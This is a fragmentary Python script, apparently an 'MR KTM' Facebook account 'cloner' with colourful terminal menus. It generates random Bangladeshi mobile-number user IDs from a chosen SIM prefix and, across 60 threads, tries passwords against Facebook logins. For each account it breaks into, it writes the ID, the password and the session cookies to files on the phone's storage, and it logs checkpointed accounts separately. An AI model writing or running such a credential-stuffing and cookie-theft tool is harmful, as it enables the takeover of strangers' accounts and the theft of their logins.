...
import string
print('\033[1;37m[\x1b[38;5;46m√\033[1;37m] \x1b[38;5;46mᴴᴵ ᴮᴿᴼᵀᴴᴱᴿ ᴵᴬᴹ ᴹᴿ ᴷᵀᴹ !! ')
time.sleep(1.5)
os.system("espeak -a 300 \"HI BROTHER IAM MR ,KTM,\"")
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
...
def Main():
	os.system('clear')
	print(logo)
	print("\033[1;31m[\x1b[38;5;46m01\033[1;31m] \033[1;37mRANDOM UID CLONING")
	...
	if opt in ["A","1","01", "a"]:
		virusA()
	if opt in ["B","b","2","02"]:
		os.system('xdg-open https://www.facfile.php?id=100072828519575&mibextid=ZbWKwL');time.sleep(1)
	if opt in ["0","0"]:
		exit()
...
def virusA():
	...
	os.system('clear')
	print(logo)
	print("\033[1;31m[\x1b[38;5;46m=\033[1;31m] \033[1;37m𝙴𝚇𝙰𝙼𝙿𝙻𝙴 •𝙱𝙰𝙽• 𝚂𝙸𝙼 𝙲𝙾𝙳𝙴=\033[1;31m:\033[1;31m[\x1b[38;5;46m017<>018<>019\033[1;31m]")
	kode = input('\033[1;31m[\x1b[38;5;46m=\033[1;31m] \033[1;37mSELECT  \033[1;31m: \x1b[38;5;46m')
	doamin = 'BD Number id cloner [ONLY-OK] '
	print('\033[1;31m[\x1b[38;5;46m=\033[1;31m] \033[1;37m𝙴𝚇𝙰𝙼𝙿𝙻𝙴 𝙻𝙸𝙼𝙸𝚃  \033[1;31m: \033[1;31m[\x1b[38;5;46m1000=5000=10000=15000=20000\033[1;31m] ')
	limit = int(input('\033[1;31m[\x1b[38;5;46m=\033[1;31m] \033[1;37m𝙴𝙽𝚃𝙴𝚁 𝚈𝙾𝚄𝚁 𝙲𝚁𝙰𝙲𝙺 𝙻𝙸𝙼𝙸𝚃= \033[1;31m: \x1b[38;5;46m'))
	...
	with ThreadPool(max_workers=60) as yaari:
		...
		print(logo)
		tl = str(len(user))
		print(f'\033[1;31m[\033[1;32m=\033[1;31m]\033[1;32m 𝚃𝙾𝚃𝙰𝙻 𝙰𝙲𝙲𝙾𝚄𝙽𝚃  \033[1;31m: \x1b[38;5;46m'+tl)
		print(f'\033[1;31m[\033[1;32m=\033[1;31m]\033[1;32m 𝚈𝙾𝚄𝚁 𝚂𝙸𝙼 𝙲𝙾𝙳𝙴 \033[1;31m: \x1b[38;5;46m{kode} ')
		print('\033[1;31m[\033[1;32m=\033[1;31m] \033[1;33m𝙲𝚁𝙰𝙲𝙺𝙸𝙽𝙶 𝚂𝚃𝙰𝚁𝚃𝙴𝙳>>')
		linex()
		for guru in user:
	...
	linex()
	print(' \033[1;31m[\033[1;32m<_>\033[1;31m] \033[1;32mCRACK PROCESS HAS BEEN COMPLETED')
	print(' \033[1;31m[\033[1;32m<_>\033[1;31m] \033[1;32mIDS SAVED IN OK.TXT,CP.TXT')
	linex()
	exit()
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                uid = coki[65:80]
                print('\033[38;5;46m[KTM-OK] ' +uid+'|'+ps+ ' ')
                # cek_apk(session,coki)                
                open('/sdcard/KTM-COOKIE.txt','a').write(uid+'|'+ps+ '|' +coki+'\n')
                open('/sdcard/KTM-OK.txt', 'a').write( uid+'|'+ps+'\n')
                oks.append(uid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[65:80]
              #   print('\033[38;5;46m[KTM-CP] ' +uid+ '|' +ps+ '  \33[0;97m')
                open('/sdcard/KTM-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(uid)
                break
            else:
                continue
